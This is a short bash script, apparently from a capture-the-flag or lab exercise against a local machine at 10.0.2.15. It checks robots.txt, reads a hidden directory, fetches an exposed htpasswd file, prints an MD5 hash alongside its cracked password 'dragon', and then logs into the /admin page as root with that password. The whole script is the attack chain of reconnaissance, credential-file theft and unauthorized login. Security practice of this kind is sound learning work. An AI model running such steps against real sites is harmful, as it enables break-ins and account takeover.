#!/bin/bash
curl "http://10.0.2.15/robots.txt" -v 
curl "http://10.0.2.15/whatever/" -v 
curl "http://10.0.2.15/whatever/htpasswd" -v 

echo "8621ffdbc5698829397d97767ac13db3 MD5 : dragon"

curl "http://10.0.2.15/admin/" --data "username=root&password=dragon&Login=Login"
